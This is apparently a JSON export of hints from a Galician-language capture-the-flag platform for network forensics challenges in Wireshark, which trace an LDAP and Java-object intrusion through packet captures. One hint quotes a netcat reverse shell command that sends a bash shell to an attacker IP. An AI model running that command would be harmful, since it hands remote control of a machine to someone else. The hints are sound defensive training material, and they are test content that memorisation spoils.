{"count":69,"results":[{"id":135,"type":"standard","challenge_id":231,"content":"Mira os paquetes ou abre Capture File Properties","cost":25,"requirements":{"prerequisites":[]}},{"id":136,"type":"standard","challenge_id":232,"content":"Configura Time Display Format a UTC","cost":25,"requirements":{"prerequisites":[]}},{"id":137,"type":"standard","challenge_id":233,"content":"Abre Capture File Properties","cost":25,"requirements":{"prerequisites":[]}},{"id":138,"type":"standard","challenge_id":234,"content":"Vai a Statistics","cost":20,"requirements":{"prerequisites":[]}},{"id":139,"type":"standard","challenge_id":234,"content":"Vai a Statistics --> Endpoints --> Ethernet","cost":20,"requirements":{"prerequisites":[138]}},{"id":140,"type":"standard","challenge_id":235,"content":"Analiza o MAC Address OUI (Organizationally Unique Identifier)","cost":20,"requirements":{"prerequisites":[]}},{"id":141,"type":"standard","challenge_id":235,"content":"Busca a direcci\u00f3n MAC nunha ferramenta online de OUIs","cost":20,"requirements":{"prerequisites":[140]}},{"id":142,"type":"standard","challenge_id":236,"content":"Google \u00e9 o teu amigo","cost":0,"requirements":null},{"id":143,"type":"standard","challenge_id":237,"content":"Vai a Statistics","cost":20,"requirements":{"prerequisites":[]}},{"id":144,"type":"standard","challenge_id":237,"content":"Vai a Statistics --> Protocol Hierarchy","cost":20,"requirements":{"prerequisites":[143]}},{"id":145,"type":"standard","challenge_id":238,"content":"Vai a Statistics","cost":20,"requirements":{"prerequisites":[]}},{"id":146,"type":"standard","challenge_id":238,"content":"Vai a Statistics --> Endpoints --> IPv4","cost":20,"requirements":{"prerequisites":[145]}},{"id":147,"type":"standard","challenge_id":239,"content":"Vai a Statistics","cost":20,"requirements":{"prerequisites":[]}},{"id":148,"type":"standard","challenge_id":239,"content":"Vai a Statistics --> Endpoints --> IPv4","cost":30,"requirements":{"prerequisites":[147]}},{"id":149,"type":"standard","challenge_id":240,"content":"Instala as bases de datos de GeoIP de MaxMind e activa a xeolocalizaci\u00f3n","cost":20,"requirements":{"prerequisites":[]}},{"id":150,"type":"standard","challenge_id":240,"content":"Vai a Statistics --> Endpoints --> IPv4","cost":20,"requirements":{"prerequisites":[149]}},{"id":151,"type":"standard","challenge_id":241,"content":"Instala as bases de datos de GeoIP de MaxMind e activa a xeolocalizaci\u00f3n","cost":20,"requirements":{"prerequisites":[]}},{"id":152,"type":"standard","challenge_id":241,"content":"Vai a Statistics --> Endpoints --> IPv4","cost":20,"requirements":{"prerequisites":[151]}},{"id":153,"type":"standard","challenge_id":242,"content":"Analiza o formato das petici\u00f3ns maliciosas e crea un display filter","cost":20,"requirements":{"prerequisites":[]}},{"id":154,"type":"standard","challenge_id":242,"content":"usa no display filter matches ou contains","cost":40,"requirements":{"prerequisites":[153]}},{"id":155,"type":"standard","challenge_id":243,"content":"Analiza a petici\u00f3n maliciosa","cost":0,"requirements":null},{"id":156,"type":"standard","challenge_id":243,"content":"Vai o paquete n\u00ba 2054 e analiza a mensaxe","cost":60,"requirements":{"prerequisites":[155]}},{"id":157,"type":"standard","challenge_id":244,"content":"Analiza a petici\u00f3n maliciosa","cost":0,"requirements":null},{"id":158,"type":"standard","challenge_id":244,"content":"Vai o paquete n\u00ba 2054 e analiza a mensaxe","cost":60,"requirements":{"prerequisites":[157]}},{"id":159,"type":"standard","challenge_id":245,"content":"Crea un display filter relacionando as Ips da v\u00edtima e o porto tcp/1389 do servidor LDAP do atacante","cost":75,"requirements":{"prerequisites":[]}},{"id":161,"type":"standard","challenge_id":246,"content":"Escolle un dos paquetes intercambiados co servidor LDAP malicioso e forza a Wireshark a que o decodifique como LDAP  --> bot\u00f3n dereito e escolle a opci\u00f3n Decode as... ","cost":75,"requirements":{"prerequisites":[]}},{"id":163,"type":"standard","challenge_id":247,"content":"Analiza a *searchRequest* e a *searchResEntry* da conversa LDAP","cost":85,"requirements":{"prerequisites":[]}},{"id":164,"type":"standard","challenge_id":248,"content":"Analiza a *searchResEntry* da conversa LDAP","cost":85,"requirements":{"prerequisites":[]}},{"id":165,"type":"standard","challenge_id":249,"content":"Crea un display filter para ver os paquetes asociados \u00e1 IP e porto da ubicaci\u00f3n do obxecto java malicioso","cost":25,"requirements":{"prerequisites":[]}},{"id":166,"type":"standard","challenge_id":249,"content":"Analiza a conversa a alto nivel usando Follow HTTP Stream","cost":75,"requirements":{"prerequisites":[165]}},{"id":167,"type":"standard","challenge_id":250,"content":"Crea un display filter para ver os paquetes asociados \u00e1 IP e porto da ubicaci\u00f3n do obxecto java malicioso","cost":25,"requirements":{"prerequisites":[]}},{"id":168,"type":"standard","challenge_id":250,"content":"Analiza a conversa a alto nivel usando Follow HTTP Stream e revisa as cabeceiras http","cost":75,"requirements":{"prerequisites":[167]}},{"id":169,"type":"standard","challenge_id":251,"content":"Crea un display filter para ver os paquetes asociados \u00e1 IP e porto da ubicaci\u00f3n do obxecto java malicioso","cost":20,"requirements":{"prerequisites":[]}},{"id":170,"type":"standard","challenge_id":251,"content":"Usa *Follow HTTP Stream* e analiza a resposta onde vai o obxecto java malicioso","cost":30,"requirements":{"prerequisites":[169]}},{"id":171,"type":"standard","challenge_id":251,"content":"Analiza que fai `nc -e /bin/bash 10.10.128.136 9999`","cost":70,"requirements":{"prerequisites":[169,170]}},{"id":172,"type":"standard","challenge_id":253,"content":"Crea un display filter","cost":0,"requirements":{"prerequisites":[]}},{"id":173,"type":"standard","challenge_id":254,"content":"Crea un display filter para ver os paquetes asociados","cost":0,"requirements":null},{"id":174,"type":"standard","challenge_id":254,"content":"Usa Follow TCP Stream e analiza","cost":40,"requirements":{"prerequisites":[173]}},{"id":175,"type":"standard","challenge_id":255,"content":"Crea un display filter para ver os paquetes asociados","cost":0,"requirements":null},{"id":176,"type":"standard","challenge_id":255,"content":"Usa *Follow TCP Stream* e analiza. ","cost":40,"requirements":{"prerequisites":[175]}},{"id":177,"type":"standard","challenge_id":256,"content":"Crea un display filter para ver os paquetes asociados","cost":0,"requirements":null},{"id":178,"type":"standard","challenge_id":256,"content":"Usa *Follow TCP Stream* e analiza","cost":40,"requirements":{"prerequisites":[177]}},{"id":179,"type":"standard","challenge_id":257,"content":"Crea un display filter para ver os paquetes asociados","cost":0,"requirements":null},{"id":180,"type":"standard","challenge_id":257,"content":"Usa Follow TCP Stream e analiza","cost":40,"requirements":{"prerequisites":[179]}},{"id":181,"type":"standard","challenge_id":258,"content":"Crea un display filter para ver os paquetes asociados","cost":0,"requirements":null},{"id":182,"type":"standard","challenge_id":258,"content":"Usa *Follow TCP Stream* e analiza","cost":40,"requirements":{"prerequisites":[181]}},{"id":183,"type":"standard","challenge_id":259,"content":"Crea un display filter","cost":0,"requirements":null},{"id":184,"type":"standard","challenge_id":259,"content":"Usa operadores l\u00f3xicos, as IPs da v\u00edtima e atacante e os nomes dos protocolos","cost":50,"requirements":{"prerequisites":[183]}},{"id":185,"type":"standard","challenge_id":260,"content":"TCP 3-Way Handshake ou sa\u00fado a tres v\u00edas","cost":40,"requirements":{"prerequisites":[]}},{"id":186,"type":"standard","challenge_id":260,"content":"Mira as condici\u00f3ns que ten o primeiro paquete dunha conexi\u00f3n tcp iniciada polo equipo v\u00edtima (ip orixe e flags tcp)","cost":60,"requirements":{"prerequisites":[185]}},{"id":187,"type":"standard","challenge_id":261,"content":"Crea un display filter para ver as conexi\u00f3ns **iniciadas** polo equipo v\u00edtima","cost":30,"requirements":{"prerequisites":[]}},{"id":188,"type":"standard","challenge_id":261,"content":"Crea un display filter con IP orixe a da v\u00edtima e o bit SYN a 1 e o bit ACK a 0 e busca un patr\u00f3n que se repite","cost":70,"requirements":{"prerequisites":[187]}},{"id":189,"type":"standard","challenge_id":262,"content":"Crea un display filter para ver as conexi\u00f3ns iniciadas polo equipo v\u00edtima","cost":30,"requirements":{"prerequisites":[]}},{"id":190,"type":"standard","challenge_id":263,"content":"Crea un display filter para ver as conexi\u00f3ns iniciadas polo equipo v\u00edtima hacia \u00f3 atacante","cost":30,"requirements":{"prerequisites":[]}},{"id":191,"type":"standard","challenge_id":263,"content":"Fai uso da funcionalidade de *Follow TCP Stream* e analiza a secuencia de acci\u00f3ns do atacante","cost":60,"requirements":{"prerequisites":[190]}},{"id":192,"type":"standard","challenge_id":264,"content":"Descarga o informe xerado pola ferramenta de enumeraci\u00f3n e rev\u00edsao","cost":30,"requirements":{"prerequisites":[]}},{"id":193,"type":"standard","challenge_id":264,"content":"Emprega a funcionalidade de Wireshark de exportar obxectos HTTP","cost":70,"requirements":{"prerequisites":[192]}},{"id":194,"type":"standard","challenge_id":265,"content":"Descarga o informe xerado pola ferramenta de enumeraci\u00f3n e rev\u00edsao","cost":30,"requirements":{"prerequisites":[]}},{"id":195,"type":"standard","challenge_id":265,"content":"Emprega a funcionalidade de Wireshark de exportar obxectos HTTP","cost":70,"requirements":{"prerequisites":[194]}},{"id":196,"type":"standard","challenge_id":266,"content":"Descarga o informe xerado pola ferramenta de enumeraci\u00f3n e rev\u00edsao","cost":30,"requirements":{"prerequisites":[]}},{"id":197,"type":"standard","challenge_id":266,"content":"Emprega a funcionalidade de Wireshark de exportar obxectos HTTP","cost":70,"requirements":{"prerequisites":[196]}},{"id":198,"type":"standard","challenge_id":267,"content":"Analiza as comunicaci\u00f3ns entre a v\u00edtima e o atacante e busca transferencias de arquivos","cost":30,"requirements":{"prerequisites":[]}},{"id":199,"type":"standard","challenge_id":267,"content":"Emprega a funcionalidade de Wireshark de exportar obxectos HTTP e revisa o c\u00f3digo fonte do exploit","cost":70,"requirements":{"prerequisites":[198]}},{"id":200,"type":"standard","challenge_id":268,"content":"Analiza as comunicaci\u00f3ns entre a v\u00edtima e o atacante e revisa as acci\u00f3ns do atacante","cost":30,"requirements":{"prerequisites":[]}},{"id":201,"type":"standard","challenge_id":268,"content":"Fai uso da funcionalidade de **Follow TCP Stream** e analiza que ficheiros de root manipula e para que","cost":70,"requirements":{"prerequisites":[200]}},{"id":202,"type":"standard","challenge_id":269,"content":"Crea un display filter para ver o tr\u00e1fico ssh","cost":30,"requirements":{"prerequisites":[]}},{"id":203,"type":"standard","challenge_id":270,"content":"Descarga o informe xerado pola ferramenta de enumeraci\u00f3n e rev\u00edsao","cost":30,"requirements":{"prerequisites":[]}},{"id":204,"type":"standard","challenge_id":270,"content":"Emprega a funcionalidade de Wireshark de exportar obxectos HTTP","cost":70,"requirements":{"prerequisites":[203]}},{"id":205,"type":"standard","challenge_id":255,"content":"Crea un *display filter* con *matches* ou *contains* para atopar ese primeiro comando","cost":40,"requirements":{"prerequisites":[175]}}],"meta":{}}